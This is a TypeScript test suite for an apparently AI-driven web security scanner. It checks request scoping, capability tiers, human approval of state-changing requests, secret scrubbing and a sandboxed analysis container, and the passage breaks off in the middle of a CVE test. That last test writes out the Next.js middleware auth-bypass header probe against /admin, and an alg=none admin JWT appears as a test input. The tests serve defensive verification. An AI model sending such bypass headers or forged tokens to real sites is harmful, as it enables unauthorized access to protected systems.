import assert from 'node:assert/strict'
import { execFile } from 'node:child_process'
import { randomUUID } from 'node:crypto'
import { once } from 'node:events'
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs'
import { createServer } from 'node:http'
import type { IncomingMessage, ServerResponse } from 'node:http'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { setTimeout as delay } from 'node:timers/promises'
import { test } from 'node:test'
import { promisify } from 'node:util'
import { declarativeReplaySpecSchema, containsDestructivePayload } from '../src/replay-spec.ts'
import type { DeclarativeReplaySpec } from '../src/replay-spec.ts'
import {
  BrokerApprovalRequired,
  BrokerCircuitOpen,
  BrokerDenied,
  RequestBroker,
} from '../src/server/broker.ts'
import type { Grant, PublicAddress } from '../src/server/broker.ts'
import { CanaryBroker } from '../src/server/canary-broker.ts'
import { ColdGraphCompactor } from '../src/server/compactor.ts'
import { queryCves } from '../src/server/cve-broker.ts'
import { cloneGithubRepos, listMountedRepos, projectReposDir, syncGithubRepos } from '../src/server/github-connector.ts'
import { privateModelProfiles, saveModelProfile } from '../src/server/model-settings.ts'
import {
  createProjectPersona,
  listProjectPersonas,
  personaSecrets,
  resolveRunPersonas,
} from '../src/server/persona-vault.ts'
import { retestReplaySpec, verifyReplaySpec } from '../src/server/replay-verifier.ts'
import { exportReportMarkdown } from '../src/server/report-export.ts'
import { ScopedBrowser } from '../src/server/scoped-browser.ts'
import { Store } from '../src/server/store.ts'
import { LinuxWorkerBackend } from '../src/server/worker-backend.ts'

const exec = promisify(execFile)

async function httpFixture(handler: (req: IncomingMessage, res: ServerResponse) => void, host = '127.0.0.1') {
  const server = createServer(handler).listen(0, host)
  await once(server, 'listening')
  const address = server.address()
  if (!address || typeof address === 'string') throw new Error('Fixture has no address.')
  return {
    port: address.port,
    url: `http://${host}:${address.port}`,
    close() {
      server.closeAllConnections()
      return new Promise<void>(resolve => server.close(() => resolve()))
    },
  }
}

const northstar = 'https://northstar.example'
const apiOrigin = 'https://api.northstar.example'
const docsOrigin = 'https://docs.northstar.example'
const publicAddr: PublicAddress = { address: '93.184.216.34', family: 4 }

function makeGrant(overrides: Partial<Grant> = {}): Grant {
  return {
    origin: northstar,
    tier: 1,
    maxRpsPerOrigin: 20,
    canRead: origin => origin === northstar,
    audit: () => {},
    ...overrides,
  }
}

function replayBaseFields(origin = northstar) {
  return {
    version: 1 as const,
    origin,
    title: 'Deterministic Replay Verification Check',
    category: 'broken-access-control' as const,
    cwe: 'CWE-287',
    severity: 'high' as const,
    severityRationale: 'Direct proof of unauthorized access or execution.',
    impact: 'An unauthenticated caller can access protected state.',
    remediation: 'Enforce strict server-side authorization checks.',
    recheckInstructions: 'Re-run the declarative replay spec after deploying the patch.',
  }
}

// ============================================================================
// 1. DNS Rebinding, Private-IP Blocking, 8-Hop Redirects & local-lab Opt-In
// ============================================================================

test('enforces DNS public-IP check, 8-hop redirect scope, abort-before-dial, and local-lab opt-in gate', async () => {
  const attempted: string[] = []
  const privateBroker = new RequestBroker({
    resolve: async () => [publicAddr, { address: '127.0.0.1', family: 4 }],
    transport: async url => { attempted.push(url.origin); throw new Error('Should not dial private IP') },
  })
  await assert.rejects(
    privateBroker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/' }, makeGrant(), AbortSignal.timeout(5_000)),
    /public addresses/,
  )
  assert.equal(attempted.length, 0)

  // local-lab requires BOTH grant.allowLocalLab=true AND GUARDIAN_ALLOW_LOCAL_LAB=1
  const prevEnv = process.env.GUARDIAN_ALLOW_LOCAL_LAB
  try {
    delete process.env.GUARDIAN_ALLOW_LOCAL_LAB
    await assert.rejects(
      privateBroker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/' }, makeGrant({ allowLocalLab: true }), AbortSignal.timeout(5_000)),
      /public addresses/,
    )
    process.env.GUARDIAN_ALLOW_LOCAL_LAB = '1'
    await assert.rejects(
      privateBroker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/' }, makeGrant({ allowLocalLab: false }), AbortSignal.timeout(5_000)),
      /public addresses/,
    )
    const labBroker = new RequestBroker({
      resolve: async () => [{ address: '127.0.0.1', family: 4 }],
      transport: async () => ({ status: 200, headers: { 'content-type': 'text/plain' }, body: 'local-lab-ok' }),
    })
    const labRes = await labBroker.executeHttp(
      { origin: northstar, method: 'GET', pathAndQuery: '/lab' },
      makeGrant({ allowLocalLab: true }),
      AbortSignal.timeout(5_000),
    )
    assert.equal(labRes.status, 200)
    assert.equal(labRes.body, 'local-lab-ok')
  } finally {
    if (prevEnv === undefined) delete process.env.GUARDIAN_ALLOW_LOCAL_LAB
    else process.env.GUARDIAN_ALLOW_LOCAL_LAB = prevEnv
  }

  // Abort while DNS is unresolved must never dial
  const lookupPending = Promise.withResolvers<PublicAddress[]>()
  const abortBroker = new RequestBroker({
    resolve: () => lookupPending.promise,
    transport: async () => { throw new Error('Dialed after abort') },
  })
  const ac = new AbortController()
  const reqPromise = assert.rejects(
    abortBroker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/' }, makeGrant(), ac.signal),
    /revoked/,
  )
  ac.abort(new Error('scope revoked'))
  await reqPromise
  lookupPending.resolve([publicAddr])

  // 8-hop redirect chain succeeds when every hop is in scope; 9th hop fails; out-of-scope hop fails
  let hopCount = 0
  const eightHopBroker = new RequestBroker({
    resolve: async () => [publicAddr],
    transport: async url => {
      hopCount += 1
      const step = Number(url.searchParams.get('hop') ?? '0')
      if (step < 8) {
        return { status: 302, headers: { location: `/?hop=${step + 1}` } }
      }
      return { status: 200, headers: { 'content-type': 'text/plain' }, body: 'landed-hop-8' }
    },
  })
  const eightRes = await eightHopBroker.executeHttp(
    { origin: northstar, method: 'GET', pathAndQuery: '/?hop=0', followRedirects: true },
    makeGrant(),
    AbortSignal.timeout(5_000),
  )
  assert.equal(eightRes.body, 'landed-hop-8')
  assert.equal(hopCount, 9) // initial + 8 redirects

  const nineHopBroker = new RequestBroker({
    resolve: async () => [publicAddr],
    transport: async url => {
      const step = Number(url.searchParams.get('hop') ?? '0')
      return { status: 302, headers: { location: `/?hop=${step + 1}` } }
    },
  })
  await assert.rejects(
    nineHopBroker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/?hop=0', followRedirects: true }, makeGrant(), AbortSignal.timeout(5_000)),
    /redirect limit/,
  )

  const escapeBroker = new RequestBroker({
    resolve: async () => [publicAddr],
    transport: async () => ({ status: 302, headers: { location: 'https://unapproved.example/leak' } }),
  })
  await assert.rejects(
    escapeBroker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/', followRedirects: true }, makeGrant(), AbortSignal.timeout(5_000)),
    /outside.*scope/,
  )

  // Path > 8 KiB and raw Authorization/Cookie headers are rejected
  await assert.rejects(
    eightHopBroker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/' + 'a'.repeat(8193) }, makeGrant(), AbortSignal.timeout(5_000)),
    /8 KiB/,
  )
  await assert.rejects(
    eightHopBroker.executeHttp(
      { origin: northstar, method: 'GET', pathAndQuery: '/', headers: { Authorization: 'Bearer nope' } },
      makeGrant(),
      AbortSignal.timeout(5_000),
    ),
    /cannot be set directly/,
  )
})

// ============================================================================
// 2. Tier 0-3 Capability Enforcement & Tier 3 Blocking HITL Approve/Deny
// ============================================================================

test('enforces Tiers 0-3 capabilities and Tier 3 HITL approval requests', async t => {
  const broker = new RequestBroker({
    resolve: async () => [publicAddr],
    transport: async (_url, _addr, _sig, opts) => ({
      status: 200,
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ ok: true, method: opts?.method }),
    }),
  })
  const sig = AbortSignal.timeout(5_000)

  // Tier 0 blocks all live traffic
  await assert.rejects(broker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/' }, makeGrant({ tier: 0 }), sig), /Tier 0/)
  await assert.rejects(broker.inspectDns(northstar, makeGrant({ tier: 0 }), sig), /Tier 0/)
  await assert.rejects(broker.inspectTls(northstar, makeGrant({ tier: 0 }), sig), /Tier 0/)

  // Tier 1 allows GET/HEAD/OPTIONS, blocks POST and executeBatch
  const t1 = await broker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/health' }, makeGrant({ tier: 1 }), sig)
  assert.equal(t1.status, 200)
  await assert.rejects(broker.executeHttp({ origin: northstar, method: 'POST', pathAndQuery: '/mutate' }, makeGrant({ tier: 1 }), sig), /Tier 3/)
  await assert.rejects(
    broker.executeBatch([
      { origin: northstar, method: 'GET', pathAndQuery: '/a' },
      { origin: northstar, method: 'GET', pathAndQuery: '/b' },
    ], makeGrant({ tier: 1 }), sig),
    /Tier 2 or Tier 3/,
  )

  // Tier 2 allows synchronized executeBatch (2..10) and an explicitly allowlisted sandbox POST,
  // blocks non-idempotent/non-allowlisted POST. (The legacy path-substring "idempotent POST"
  // predicate no longer bypasses authorization: a Tier-2 write needs the operator's explicit
  // sandboxWriteAllowlist entry, which is what this regression now uses.)
  const batch = await broker.executeBatch([
    { origin: northstar, method: 'GET', pathAndQuery: '/r1' },
    { origin: northstar, method: 'GET', pathAndQuery: '/r2' },
    { origin: northstar, method: 'GET', pathAndQuery: '/r3' },
  ], makeGrant({ tier: 2 }), sig)
  assert.equal(batch.length, 3)

  const gqlOk = await broker.executeHttp(
    { origin: northstar, method: 'POST', pathAndQuery: '/graphql', body: '{"query":"{ __typename }"}' },
    makeGrant({
      tier: 2,
      sandboxWriteAllowlist: [{ origin: northstar, method: 'POST', pathPattern: '/graphql' }],
    }),
    sig,
  )
  assert.equal(gqlOk.status, 200)
  await assert.rejects(
    broker.executeHttp({ origin: northstar, method: 'PUT', pathAndQuery: '/items/1' }, makeGrant({ tier: 2 }), sig),
    /Tier 3/,
  )

  // Tier 3 throws BrokerApprovalRequired until approved
  await assert.rejects(
    broker.executeHttp(
      { origin: northstar, method: 'POST', pathAndQuery: '/state-probe' },
      makeGrant({ tier: 3, isStateChangeApproved: () => false }),
      sig,
    ),
    err => err instanceof BrokerApprovalRequired,
  )
  const approvedRes = await broker.executeHttp(
    { origin: northstar, method: 'POST', pathAndQuery: '/state-probe' },
    makeGrant({ tier: 3, isStateChangeApproved: (_o, m, p) => m === 'POST' && p === '/state-probe' }),
    sig,
  )
  assert.equal(approvedRes.status, 200)

  // Store-level HITL approval request lifecycle (approve + deny)
  const dir = mkdtempSync(join(tmpdir(), 'guardian-hitl-'))
  t.after(() => rmSync(dir, { recursive: true, force: true }))
  const storage = new Store(dir)
  t.after(() => storage.close())
  const { id: projectId } = storage.createProject({ requestId: randomUUID(), name: 'HITL', seeds: [northstar], environment: 'public' })
  const { id: runId } = storage.createRun({
    requestId: randomUUID(), projectId, goal: 'Tier 3 test', sourceMode: 'public',
    capabilityTier: 3, budgetUsd: 25, budgetRequests: 100, maxRpsPerOrigin: 5, workerConcurrency: 2, workerMaxTurns: 20,
  })
  storage.command({ requestId: randomUUID(), runId, action: 'discover', consent: true })
  const asset = storage.run(runId).candidates[0]
  storage.command({ requestId: randomUUID(), runId, action: 'scope', expectedScopeRevision: 0, assetIds: [asset.id], consent: true, capabilityTier: 3 })
  const worker = storage.makeWorker(storage.run(runId), 'investigation', asset, 'Probe', 'Test approval')
  const req1 = storage.createApprovalRequest(storage.run(runId), worker, {
    origin: northstar, method: 'POST', pathAndQuery: '/eval', rationale: 'Safe dynamic math proof', requestPreview: 'POST /eval',
  })
  const req2 = storage.createApprovalRequest(storage.run(runId), worker, {
    origin: northstar, method: 'POST', pathAndQuery: '/other', rationale: 'Second probe', requestPreview: 'POST /other',
  })
  assert.equal(storage.listApprovalRequests(runId, 'pending').length, 2)
  storage.command({ requestId: randomUUID(), runId, action: 'decide_approval', approvalId: req1.id, decision: 'approved' })
  storage.command({ requestId: randomUUID(), runId, action: 'decide_approval', approvalId: req2.id, decision: 'denied' })
  assert.equal(storage.getApprovalRequest(runId, req1.id).status, 'approved')
  assert.equal(storage.getApprovalRequest(runId, req2.id).status, 'denied')
})

// ============================================================================
// 3. Persona Vault Isolation & Zero Secret Leaks
// ============================================================================

test('isolates persona secrets at 0600, strips auth on cross-origin redirect, and prevents leaks across exchanges/artifacts/exports', async t => {
  const dir = mkdtempSync(join(tmpdir(), 'guardian-persona-vault-'))
  t.after(() => rmSync(dir, { recursive: true, force: true }))
  const storage = new Store(dir)
  t.after(() => storage.close())

  const rawSecret = 'super-secret-tenant-a-jwt-token-88123'
  const { id: projectId } = storage.createProject({ requestId: randomUUID(), name: 'Vault Test', seeds: [northstar, docsOrigin], environment: 'public' })
  const created = createProjectPersona(storage, {
    requestId: randomUUID(),
    projectId,
    handle: 'tenant_a',
    roleLabel: 'Standard Tenant A',
    originAllowlist: [northstar], // docsOrigin NOT in persona allowlist
    authKind: 'bearer',
    secret: rawSecret,
    canaryMarkers: ['TENANT_A_MARKER'],
  })

  // Public listing never exposes raw secret
  const pubList = listProjectPersonas(storage, projectId)
  assert.equal(pubList.length, 1)
  assert.ok(!JSON.stringify(pubList).includes(rawSecret))

  // Credential file on disk is strictly 0600
  const credFiles = readFileSync(join(dir, 'guardian.sqlite'))
  assert.ok(!credFiles.includes(rawSecret), 'Raw persona secret must never be stored in SQLite.')
  const credDir = join(dir, 'credentials')
  const { readdirSync } = await import('node:fs')
  const files = readdirSync(credDir)
  assert.equal(files.length, 1)
  assert.equal(statSync(join(credDir, files[0])).mode & 0o777, 0o600)

  const { id: runId } = storage.createRun({
    requestId: randomUUID(), projectId, goal: 'Persona isolation check', sourceMode: 'public',
    capabilityTier: 2, budgetUsd: 25, budgetRequests: 100, maxRpsPerOrigin: 10, workerConcurrency: 2, workerMaxTurns: 20,
  })
  storage.command({ requestId: randomUUID(), runId, action: 'discover', consent: true })
  const allAssets = storage.run(runId).candidates
  storage.command({
    requestId: randomUUID(), runId, action: 'scope', expectedScopeRevision: 0,
    assetIds: allAssets.map(a => a.id), consent: true, capabilityTier: 2, approvedPersonaIds: [created.id],
  })

  const resolvedPersonas = resolveRunPersonas(storage, projectId, [created.id])
  const secrets = personaSecrets(resolvedPersonas)
  const sentAuthByOrigin: Array<{ origin: string; auth?: string }> = []

  const broker = new RequestBroker({
    resolve: async () => [publicAddr],
    transport: async (url, _addr, _sig, opts) => {
      sentAuthByOrigin.push({ origin: url.origin, auth: opts?.headers?.Authorization })
      if (url.origin === northstar && url.pathname === '/redirect-cross') {
        return { status: 302, headers: { location: docsOrigin + '/landing' } }
      }
      // Echo back the secret in response body & header to prove broker scrubs it before returning!
      return {
        status: 200,
        headers: { 'content-type': 'application/json', 'x-echo': rawSecret },
        body: JSON.stringify({ echoedSecret: rawSecret, user: 'tenant_a' }),
      }
    },
  })

  const grant = makeGrant({
    tier: 2,
    personas: resolvedPersonas,
    secrets,
    canRead: o => o === northstar || o === docsOrigin,
  })

  // Direct request to origin NOT in persona.originAllowlist is rejected
  await assert.rejects(
    broker.executeHttp({ origin: docsOrigin, method: 'GET', pathAndQuery: '/private', persona: 'tenant_a' }, grant, AbortSignal.timeout(5_000)),
    /originAllowlist/,
  )

  // Cross-origin redirect from allowlisted northstar -> docsOrigin injects on hop 1, STRIPS on hop 2
  const redirEx = await broker.executeHttp(
    { origin: northstar, method: 'GET', pathAndQuery: '/redirect-cross', persona: 'tenant_a', followRedirects: true },
    grant,
    AbortSignal.timeout(5_000),
  )
  assert.deepEqual(sentAuthByOrigin, [
    { origin: northstar, auth: 'Bearer ' + rawSecret },
    { origin: docsOrigin, auth: undefined },
  ])
  // Even when the server echoes the secret, the broker scrubs it to [persona:tenant_a:secret]
  assert.ok(!JSON.stringify(redirEx).includes(rawSecret))
  assert.ok(redirEx.body.includes('[persona:tenant_a:secret]'))

  // Persist into exchanges, facts, artifacts, report, and Markdown export -> zero leaks anywhere!
  const run = storage.run(runId)
  const primaryAsset = run.candidates.find(c => c.origin === northstar)!
  const worker = storage.makeWorker(run, 'investigation', primaryAsset, 'Persona check', 'Inspect response')
  const savedEx = storage.recordExchange({
    runId: run.id,
    assignmentId: worker.id,
    scopeRevision: run.scopeRevision,
    origin: redirEx.origin,
    finalOrigin: redirEx.finalOrigin,
    redirectOrigins: redirEx.redirectOrigins,
    method: redirEx.method,
    pathAndQuery: redirEx.pathAndQuery,
    personaHandle: redirEx.personaHandle,
    status: redirEx.status,
    mediaType: redirEx.mediaType,
    reqHeaders: redirEx.reqHeaders,
    respHeaders: redirEx.respHeaders,
    body: redirEx.body,
    durationMs: redirEx.durationMs,
    secrets,
  })
  const ftsHits = storage.searchExchanges(runId, 'tenant_a', { approvedOrigins: new Set([northstar, docsOrigin]) })
  assert.ok(ftsHits.some(h => h.id === savedEx.id))
  storage.addFact(run, worker, {
    kind: 'auth',
    origin: northstar,
    summary: `Observed token ${rawSecret}`,
    data: { leak: rawSecret },
    exchangeIds: [savedEx.id],
    secrets,
  })
  const artifact = storage.addArtifact(run, worker, 'analysis', 'Leak check', JSON.stringify({ secret: rawSecret }), undefined, secrets)
  assert.ok(!storage.artifact(runId, artifact.id).content.includes(rawSecret))

  storage.writeReport(storage.run(runId), false)
  const report = storage.runDetail(runId).reports[0]
  assert.ok(report)
  const markdown = exportReportMarkdown(storage, runId, report.id).content
  assert.ok(!markdown.includes(rawSecret), 'Raw persona secret leaked into Markdown export!')

  // Live on-disk secret rotation (e.g., short-lived Clerk JWT refresh via atomic 0600 temp+rename):
  // broker must immediately send the rotated token while still scrubbing BOTH old and new tokens!
  const rotatedSecret = 'guardian-secret-token-rotated-99887766'
  const { renameSync, writeFileSync } = await import('node:fs')
  const personaFile = join(credDir, files[0])
  const tmpFile = personaFile + '.tmp'
  writeFileSync(tmpFile, rotatedSecret, { mode: 0o600 })
  renameSync(tmpFile, personaFile)

  let echoedAuth: string | undefined
  const rotateBroker = new RequestBroker({
    resolve: async () => [publicAddr],
    transport: async (_url, _addr, _sig, opts) => {
      echoedAuth = opts?.headers?.Authorization
      return {
        status: 200,
        headers: { 'content-type': 'application/json', 'x-echo-old': rawSecret, 'x-echo-new': rotatedSecret },
        body: JSON.stringify({ old: rawSecret, fresh: rotatedSecret }),
      }
    },
  })
  const rotatedEx = await rotateBroker.executeHttp(
    { origin: northstar, method: 'GET', pathAndQuery: '/rotated', persona: 'tenant_a' },
    grant,
    AbortSignal.timeout(5_000),
  )
  assert.equal(echoedAuth, 'Bearer ' + rotatedSecret)
  const serializedRotated = JSON.stringify(rotatedEx)
  assert.ok(!serializedRotated.includes(rawSecret), 'Previous persona secret leaked after rotation!')
  assert.ok(!serializedRotated.includes(rotatedSecret), 'Rotated persona secret leaked!')
})

// ============================================================================
// 4. Sliding-Window 5xx / 429 Defensive Circuit Breaker
// ============================================================================

test('opens defensive circuit breaker on 5xx and 429 spikes and blocks further traffic', async () => {
  const audits: string[] = []
  let transportCalls = 0
  const broker5xx = new RequestBroker({
    resolve: async () => [publicAddr],
    transport: async () => {
      transportCalls += 1
      return { status: 503, headers: { 'content-type': 'text/plain' }, body: 'unavailable' }
    },
    circuit5xxThreshold: 5,
    circuitWindowMs: 30_000,
  })
  const grant = makeGrant({ audit: outcome => audits.push(outcome) })
  for (let i = 0; i < 4; i += 1) {
    const res = await broker5xx.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: `/p${i}` }, grant, AbortSignal.timeout(5_000))
    assert.equal(res.status, 503)
  }
  await assert.rejects(
    broker5xx.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/p4' }, grant, AbortSignal.timeout(5_000)),
    err => err instanceof BrokerCircuitOpen,
  )
  assert.equal(broker5xx.isCircuitOpen(northstar), true)
  assert.ok(audits.includes('circuit_open'))

  // Subsequent request fails fast without dialing transport
  const callsBefore = transportCalls
  await assert.rejects(
    broker5xx.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/p5' }, grant, AbortSignal.timeout(5_000)),
    err => err instanceof BrokerCircuitOpen,
  )
  assert.equal(transportCalls, callsBefore)

  // 429 sliding window threshold (8)
  const broker429 = new RequestBroker({
    resolve: async () => [publicAddr],
    transport: async () => ({ status: 429, headers: { 'content-type': 'text/plain' }, body: 'slow down' }),
    circuit429Threshold: 8,
    circuitWindowMs: 30_000,
  })
  for (let i = 0; i < 7; i += 1) {
    const res = await broker429.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: `/r${i}` }, makeGrant(), AbortSignal.timeout(5_000))
    assert.equal(res.status, 429)
  }
  await assert.rejects(
    broker429.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/r7' }, makeGrant(), AbortSignal.timeout(5_000)),
    err => err instanceof BrokerCircuitOpen,
  )
  assert.equal(broker429.isCircuitOpen(northstar), true)
})

// ============================================================================
// 5. Persistent --network none Intent Container, Analyzers, Abort Kill & Orphan Cleanup
// ============================================================================

test('enforces --network none intent container, NDJSON staging, all offline analyzers, instant abort kill, and orphan cleanup', { timeout: 30_000 }, async t => {
  // Reject non-Unix DOCKER_HOST
  const prevDockerHost = process.env.DOCKER_HOST
  try {
    process.env.DOCKER_HOST = 'tcp://docker.example:2376'
    await assert.rejects(
      new LinuxWorkerBackend().run({ assignmentId: randomUUID(), files: [], command: 'true', outputs: [] }, AbortSignal.timeout(5_000)),
      /local Docker Unix socket/,
    )
  } finally {
    if (prevDockerHost === undefined) delete process.env.DOCKER_HOST
    else process.env.DOCKER_HOST = prevDockerHost
  }

  const wsDirA = mkdtempSync(join(tmpdir(), 'guardian-ws-a-'))
  const wsDirB = mkdtempSync(join(tmpdir(), 'guardian-ws-b-'))
  t.after(() => {
    rmSync(wsDirA, { recursive: true, force: true })
    rmSync(wsDirB, { recursive: true, force: true })
  })

  const backendA = new LinuxWorkerBackend({ workspace: { id: 'ws-a', directory: wsDirA } })
  const assignmentId = randomUUID()
  const sessionAbort = new AbortController()
  const session = await backendA.openSession(assignmentId, sessionAbort.signal)
  t.after(() => session.close())

  // Verify container host config & zero network reachability to Docker bridge gateway
  const gateway = (await exec('docker', ['network', 'inspect', 'bridge', '--format', '{{(index .IPAM.Config 0).Gateway}}'])).stdout.trim()
  const hostFixture = await httpFixture((_req, res) => res.end('host-secret'), gateway)
  t.after(() => hostFixture.close())

  let containerId = ''
  for (let attempt = 0; attempt < 60 && !containerId; attempt += 1) {
    containerId = (await exec('docker', ['ps', '-q', '--filter', 'label=dev.guardian.assignment=' + assignmentId])).stdout.trim()
    if (!containerId) await delay(50)
  }
  assert.ok(containerId, 'Persistent intent container must be running.')
  const hostConfig = JSON.parse((await exec('docker', ['inspect', '--format', '{{json .HostConfig}}', containerId])).stdout)
  assert.equal(hostConfig.NetworkMode, 'none')
  assert.equal(hostConfig.Privileged, false)
  assert.equal(hostConfig.ReadonlyRootfs, true)
  assert.ok(hostConfig.Memory >= 1 && hostConfig.Memory <= 1536 * 1024 * 1024)
  assert.ok(hostConfig.NanoCpus >= 1 && hostConfig.NanoCpus <= 2_000_000_000)
  assert.ok(hostConfig.PidsLimit >= 1 && hostConfig.PidsLimit <= 256)
  assert.match(hostConfig.Tmpfs['/tmp'], /size=128m/)
  assert.equal(hostConfig.Binds, null)

  const probe = [
    'if (process.getuid() !== 10001) process.exit(11)',
    "if (require('node:fs').existsSync('/var/run/docker.sock')) process.exit(12)",
    "if (process.env.OPENROUTER_API_KEY || process.env.GUARDIAN_DATA_DIR) process.exit(13)",
    "fetch(process.argv[1], {signal: AbortSignal.timeout(700)}).then(() => process.exit(14), () => console.log('blocked'))",
  ].join('\n')
  const probeRes = await exec('docker', ['exec', containerId, 'node', '-e', probe, hostFixture.url])
  assert.equal(probeRes.stdout.trim(), 'blocked')

  // NDJSON staging + just-bash exec + read-only /evidence
  const stagedPath = await session.stage('bundle.js', [
    'fetch("/api/v2/admin/users");',
    'window.addEventListener("message", e => { document.body.innerHTML = e.data; });',
    'const k = "AKIAIOSFODNN7EXAMPLE";',
    '//# sourceMappingURL=bundle.js.map',
  ].join('\n'), AbortSignal.timeout(10_000))
  assert.equal(stagedPath, '/evidence/bundle.js')

  const execRes = await session.exec(
    'rg -o "/api/v2/[a-z/]+" /evidence/bundle.js > /work/found.txt',
    ['found.txt'],
    AbortSignal.timeout(10_000),
  )
  assert.equal(execRes.exitCode, 0)
  assert.equal(execRes.outputs['found.txt'].trim(), '/api/v2/admin/users')

  // Read-only /evidence cannot be mutated
  await assert.rejects(
    session.exec("printf 'bad' > /evidence/bundle.js", [], AbortSignal.timeout(10_000)),
    /EROFS|read-only/i,
  )

  // Test ALL offline analyzers inside the persistent --network none container
  const jsOut = await session.analyze('js-harvest', { file: 'bundle.js' }, AbortSignal.timeout(10_000))
  assert.ok((jsOut.apiPaths as string[]).includes('/api/v2/admin/users'))
  assert.ok((jsOut.sourceMaps as string[]).includes('bundle.js.map'))
  assert.ok((jsOut.domSinks as string[]).includes('message-listener'))

  const secretOut = await session.analyze('secret-scan', { file: 'bundle.js' }, AbortSignal.timeout(10_000))
  assert.ok((secretOut.matches as Array<{ kind: string }>).some(m => m.kind === 'aws-access-key'))

  const techOut = await session.analyze('tech-fingerprint', {
    url: northstar,
    headers: { 'x-powered-by': 'Next.js 14.2.20', 'x-nextjs-cache': 'HIT' },
    body: '<script src="/_next/static/chunks/main.js"></script>',
  }, AbortSignal.timeout(10_000))
  assert.ok((techOut.technologies as Array<{ package: string; version?: string }>).some(x => x.package === 'next' && x.version === '14.2.20'))

  const fakeJwt = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url') + '.' +
    Buffer.from(JSON.stringify({ sub: 'u1', role: 'admin' })).toString('base64url') + '.'
  const jwtOut = await session.analyze('jwt-inspect', { text: fakeJwt }, AbortSignal.timeout(10_000))
  assert.equal(jwtOut.valid, true)
  assert.ok((jwtOut.warnings as string[]).some(w => w.includes('alg=none')))

  const gqlOut = await session.analyze('graphql-parse', {
    text: JSON.stringify({
      data: {
        __schema: {
          queryType: { name: 'Query' },
          types: [{ name: 'Query', kind: 'OBJECT', fields: [{ name: 'viewer' }, { name: 'adminSecrets' }] }],
        },
      },
    }),
  }, AbortSignal.timeout(10_000))
  assert.equal(gqlOut.introspectionEnabled, true)
  assert.ok((gqlOut.queries as string[]).includes('adminSecrets'))

  const diffOut = await session.analyze('diff-response', {
    control: { status: 200, mediaType: 'text/html', body: '<!doctype html><html><body><div id="root">My SPA App Shell</div></body></html>' },
    probe: { status: 200, mediaType: 'text/html', body: '<!doctype html><html><body><div id="root">My SPA App Shell</div></body></html>' },
  }, AbortSignal.timeout(10_000))
  assert.equal(diffOut.likelySpaCatchall, true)

  const dnsOut = await session.analyze('dns-takeover', {
    hostname: 'dangling.northstar.example',
    cnames: ['ghost-app.github.io'],
    a: [],
    aaaa: [],
    status: 404,
    body: "There isn't a GitHub Pages site here.",
  }, AbortSignal.timeout(10_000))
  assert.equal(dnsOut.likelyTakeover, true)

  // Instant kill on sessionAbort
  sessionAbort.abort(new Error('scope revoked'))
  for (let i = 0; i < 40; i += 1) {
    const alive = (await exec('docker', ['ps', '-q', '--filter', 'id=' + containerId])).stdout.trim()
    if (!alive) break
    await delay(100)
  }
  assert.equal((await exec('docker', ['ps', '-q', '--filter', 'id=' + containerId])).stdout.trim(), '')

  // Orphan cleanup removes abandoned container for ws-a while preserving ws-b's container
  const { createHash } = await import('node:crypto')
  const { realpathSync } = await import('node:fs')
  const ownerHash = (id: string, d: string) => createHash('sha256').update(id).update('\0').update(realpathSync(d)).digest('hex')
  const orphanA = 'guardian-' + randomUUID()
  const foreignB = 'guardian-' + randomUUID()
  await exec('docker', [
    'container', 'create', '--name', orphanA, '--network', 'none',
    '--label', `dev.guardian.workspace=${ownerHash('ws-a', wsDirA)}`, 'guardian-worker:local', '--session',
  ])
  await exec('docker', [
    'container', 'create', '--name', foreignB, '--network', 'none',
    '--label', `dev.guardian.workspace=${ownerHash('ws-b', wsDirB)}`, 'guardian-worker:local', '--session',
  ])
  t.after(async () => {
    await exec('docker', ['container', 'rm', '--force', orphanA, foreignB]).catch(() => undefined)
  })
  await backendA.reclaimInactive()
  assert.equal((await exec('docker', ['ps', '-a', '-q', '--filter', 'name=' + orphanA])).stdout.trim(), '')
  assert.ok((await exec('docker', ['ps', '-a', '-q', '--filter', 'name=' + foreignB])).stdout.trim())
})

// ============================================================================
// 6. Runtime Tech Fingerprint + CVE Broker (CVE-2025-29927) & SPA Catch-all Immunity
// ============================================================================

test('correlates CVE-2025-29927 hypothesis, confirms vulnerable fixture, rules out edge-blocked, and rejects SPA catch-all', async () => {
  const prevOffline = process.env.GUARDIAN_OFFLINE
  process.env.GUARDIAN_OFFLINE = '1'
  try {
    const advisories = await queryCves({ ecosystem: 'npm', package: 'next', version: '14.2.20' })
    const cve = advisories.find(a => a.id === 'CVE-2025-29927')
    assert.ok(cve, 'Curated CVE-2025-29927 advisory must be returned for Next.js.')
    assert.equal(cve.severity, 'critical')
  } finally {
    if (prevOffline === undefined) delete process.env.GUARDIAN_OFFLINE
    else process.env.GUARDIAN_OFFLINE = prevOffline
  }

  const backend = new LinuxWorkerBackend()
  const cveReplaySpec: DeclarativeReplaySpec = {
    ...replayBaseFields(northstar),
    kind: 'http_chain',
    title: 'Next.js Middleware Auth Bypass (CVE-2025-29927)',
    cwe: 'CWE-287',
    severity: 'critical',
    spaCatchallControl: true,
    steps: [
      {
        id: 'control',
        role: 'control',
        description: 'Request /admin without spoofed middleware header (expect 401/403/302).',
        request: { origin: northstar, method: 'GET', pathAndQuery: '/admin', followRedirects: false },
      },
      {
        id: 'probe',
        role: 'probe',
        description: 'Request /admin with x-middleware-subrequest header.',
        request: {
          origin: northstar,
          method: 'GET',
          pathAndQuery: '/admin',
          headers: { 'x-middleware-subrequest': 'middleware:middleware:middleware:middleware:middleware' },
          followRedirects: false,
        },
      },
    ],
    assertionsJq: `{
